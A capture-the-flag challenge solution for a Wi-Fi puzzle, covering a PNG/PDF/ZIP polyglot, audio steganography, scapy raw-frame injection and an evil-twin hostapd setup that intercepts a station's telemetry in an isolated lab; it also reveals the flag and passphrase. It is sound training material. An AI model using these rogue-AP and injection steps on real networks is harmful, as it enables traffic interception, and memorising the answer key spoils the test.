# WiFi Challenge 8 — Something in the Static

**Category:** Wi-Fi
**Difficulty:** Insane
**Author:** Lt. Rico Kopernicus

## Description
Our frequency analyzer flagged something strange on the 5180 MHz band.
The signals are steady and deliberate when it's in range, and they've
been repeating for hours. Nothing we know about is on that frequency.
I captured a .png it transmitted, but it drifted out of range before
I could get a look at its beacons. The file itself seems off: its WAY
bigger than a regular photo at that resolution. Something is out there,
and I'd like to know what it wants.

## Attached Files
- `dist/challenge8/capture.png`

The competitor only downloads a single file, `capture.png`. It is a
**PNG + PDF + ZIP polyglot** (built by `scripts/generate_polyglot/gen_polyglot.py`),
so the same bytes are simultaneously valid as all three formats:

- **PNG view** — opens as an ordinary satellite image. This is the only thing a
  casual viewer sees; the carrier image renders unchanged.
- **PDF view** — `%PDF-` rides in an early ancillary PNG chunk and the
  xref/trailer sit in the ZIP's end-of-central-directory comment, so opening the
  file as a PDF draws a page with the (redacted) evil-twin `hostapd` config plus
  two flavor hints:
  `YOU HAVE TO CLOSE MY EYES FIRST.` and
  `USE THIS TO TAKE CONTROL OF MY RAVENS AFTER.` — i.e. disable `ODINS_EYES`
  (the override signal) before standing up the evil twin that captures Huginn's
  ("raven") telemetry.
- **ZIP view** — the archive appended at EOF unpacks the two capture recordings,
  `capture-01.wav` and `capture-02.wav`, which carry the audio stego described
  below.


## Flag

`flag{5ur7r_i5_w4tchin9}`

## Attack summary
`ctf-router` runs the real `ODINS_EYES` AP (`hostapd` on `wlan0`) plus a monitor-mode interface
on the SAME phy (`wlan0-mon`) that a small listener process watches for a
raw, unassociated **override signal**: a Probe Request carrying a specific
vendor-specific information element (802.11 element ID 221 — OUI + OUI-type +
payload). No association or credentials are needed to send this — it's a
raw-frame signal, not a network service — but the payload itself is
passkey-gated: only an exact byte-for-byte match disables the AP (players
recover the passcode from `capture-01.wav`).

Once disabled, the intended path is an evil-twin mechanic:
clone `ODINS_EYES`'s SSID, BSSID, and get the passphrase from solving the
riddle in `capture-02.wav`. `Huginn`'s `wpa_supplicant` reassociates
automatically, and because the attacker's own `hostapd`
completes a genuine 4-way handshake using the real passphrase, the resulting
CCMP link decrypts transparently: Huginn's telemetry just shows up as
plaintext UDP on the attacker's own AP interface. No manual crypto step is
required.

The override-signal shape is discovered via a non-secret heartbeat vendor IE broadcast in every beacon shows the *shape* of the mechanism, and `capture-01.wav` hides the real key (the payload) as an audio-stego spectrogram of wingdings that map to real letters, spelling out `OVERRIDE: ODN-CLOS-EYES`.

## Solution steps

0. **Crack open the polyglot.** The single provided `capture.png` is a
   PNG+PDF+ZIP polyglot. Besides viewing it as an image, players should:
   ```
   file capture.png            # reports PNG, but binwalk/unzip reveal more
   binwalk capture.png         # shows the appended ZIP (and PDF structures)
   unzip capture.png           # -> capture-01.wav, capture-02.wav
   # open capture.png in any PDF viewer -> redacted evil-twin config + hints
   ```
   The PDF page spells out the intended order of operations ("close my eyes
   first", then "take control of my ravens") and the shape of the evil-twin
   `hostapd` config with its secret values blanked out. The ZIP yields the two
   `.wav` captures used in steps 2 and 5.

1. **Recon.** The description tells players that the anamoly was detected on 5180 MHz,
which is 5GHz wifi channel 36. Confirm `ODINS_EYES`'s BSSID and channel, and that `Huginn`
is associated to it:
   ```
   airmon-ng start wlan0
   airodump-ng --band a -c 36 wlan0mon
   ```

2. **Discover the override key.** Two independent conveyances:

   - **Shape hint (non-secret, over the air).**  
     Capture a beacon or probe response from `ODINS_EYES` and
     inspect its vendor-specific IEs (`tcpdump -i wlan0mon -e -s0 -X`).
     A vendor IE is present with the OUI `52:5a:52` and OUI-type
     `0x01`, with a fixed, non-secret payload (`HEARTBEAT-ALIVE`) — this shows
     that element 221 (`0xdd`) / OUI `52:5a:52` / OUI-type `0x01` is "live". It
     does not itself contain the key.
   - **Key value (audio stego, `capture-01.wav`).**  
     Open the extracted `capture-01.wav` in Audacity (or `sox`/`matplotlib.specgram`) and switch to spectrogram view. Underneath the noisy waveform,
     the spectrogram renders a sequence of dingbat glyphs (Microsoft WingDings). Translating them via a Wingdings character reference back to ASCII yields the real override key, `ODN-CLOS-EYES`.

3. **Craft and transmit the override signal.** From a monitor-mode
   interface, send a Probe Request carrying the vendor-specific IE with the
   correct payload (OUI `52:5a:52`, OUI-type `0x01`, followed by the
   override key):

   ```python
   from scapy.all import RadioTap, sendp
   from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11ProbeReq

   OVERRIDE_KEY = b"ODN-CLOS-EYES"                # decoded from capture-01.wav
   vendor_ie = b"\x52\x5a\x52\x01" + OVERRIDE_KEY

   frame = (
       RadioTap()
       / Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
               addr2="02:00:00:00:99:99", addr3="ff:ff:ff:ff:ff:ff")
       / Dot11ProbeReq()
       / Dot11Elt(ID=0, info=b"")               # empty/wildcard SSID
       / Dot11Elt(ID=221, info=vendor_ie)
   )
   sendp(frame, iface="wlan0mon", count=5, inter=0.1)
   ```

   No association is needed — the listener sees this via `ctf-router`'s
   monitor interface regardless of whether hostapd itself does anything with
   the probe request.

4. **Confirm the takedown.** `ODINS_EYES`'s beacon stops and `Huginn`/
   `Muninn` deauth immediately.

5. **Stand up the evil twin.** Clone the real AP's SSID, BSSID, and
   (separately-obtained) passphrase on one of the radios. `macchanger`
   is installed in this container and can be used to set the BSSID.
   This block is safe to rerun as-is (kills any evil-twin `hostapd`
   from a previous attempt first):

   ```
   pkill -f 'hostapd -B /tmp/evil-twin.conf' 2>/dev/null || true
   sleep 1

   ip link set wlan1 down
   macchanger -m 02:00:00:00:13:01 wlan1
   ip link set wlan1 up

   cat > /tmp/evil-twin.conf <<'EOF'
   interface=wlan1
   ssid=ODINS_EYES
   hw_mode=a
   channel=36
   country_code=US
   ieee80211d=1
   ieee80211w=2
   wpa=2
   auth_algs=1
   wpa_key_mgmt=WPA-PSK
   rsn_pairwise=CCMP
   wpa_passphrase=ferrumaurum
   EOF

   hostapd -B /tmp/evil-twin.conf
   ip addr replace 10.13.0.1/24 dev wlan1
   ```

   **Ordering matters:** the real AP must be disabled first (step 4). Two
   live BSSes simultaneously claiming the same BSSID+SSID is ambiguous for a
   supplicant to resolve reliably.

6. **Wait for reassociation, then read the telemetry.** `Huginn`'s
   `wpa_supplicant` rescans and reconnects to whichever AP answers for
   `ODINS_EYES` with a matching passphrase. `airodump-ng` will show a captured
   handshake and packets being sent again from the stations to the player's AP.
   Now, the player can detect the activity on port 9000 and read it:

   ```
   nc -ul 9000
   ```

   The payload arrives already decrypted — the attacker's own `hostapd`
   installed the real PTK for that station during its handshake, so mac80211
   decrypts incoming CCMP frames automatically before they reach the UDP
   listener. No monitor mode, no manual CCMP decryption.

7. **Read the flag** from the telemetry payload:

   ```
    === STATION TELEMETRY EXPORT ===
    ...
    'INTERCOM_MESSAGE: flag{5ur7r_i5_w4tchin9}'
   ```

## Why the trivial bypasses fail

- **PSK crack:** `ieee80211w=2` is set on both the real AP and on
  Huginn/Munnin to require encrypted management frames, thereby preventing
  unauthenticated deauth attacks (like WiFi challenge 2). Plus, `ODINS_EYES`'s
  `wpa_passphrase` is a string not in the provided `rockyou.txt`.
- **Attack Muninn instead:** `Muninn` is a stock, non-vulnerable
  `wpa_supplicant` decoy on the same network that transmits nothing useful;
  it also reassociates to the evil twin, but produces no telemetry.
- **Skip the override signal, run the evil twin immediately:** two live
  BSSes on the same BSSID+SSID at once is ambiguous for the supplicant to
  arbitrate reliably (see Environment notes) — and without the real
  passphrase the impersonating AP can't complete a valid handshake with
  `Huginn` anyway.
- **Malformed/guessed override payload:** the listener requires an exact
  byte match (OUI + OUI-type + key) — a bare probe request or a guessed
  string does nothing observable, by design (no error/ack is sent back over
  the air; this is a one-way signal, not a protocol to fuzz interactively).
- **Directly connecting to ODINS_EYES with the password:** once player's get
  the password from `capture-02.wav`, nothing stops them from connecting, but
  they cannot see the encrypted log data coming from Huginn. The only way to
  see it without following the intended solve path is to capture a handshake
  in a similar fashion to the psk cracking challenges; however, `ieee80211w`
  is enforced on this network, causing deauth packets to also be encrypted
  and preventing players from triggering one to capture a handshake.

## Environment notes (GM)

- Isolated net `10.13.0.0/24`, not bridged to `br0`: AP host `10.13.0.1`
  (whichever `hostapd` currently holds `wlan0`/the evil twin's interface),
  Huginn `10.13.0.10`, Muninn `10.13.0.11`.

## Techniques / Tags

`wireless`, `wifi`, `wpa2`, `raw-frame-injection`, `vendor-ie`, `evil-twin`,
`rogue-ap`, `deauth`
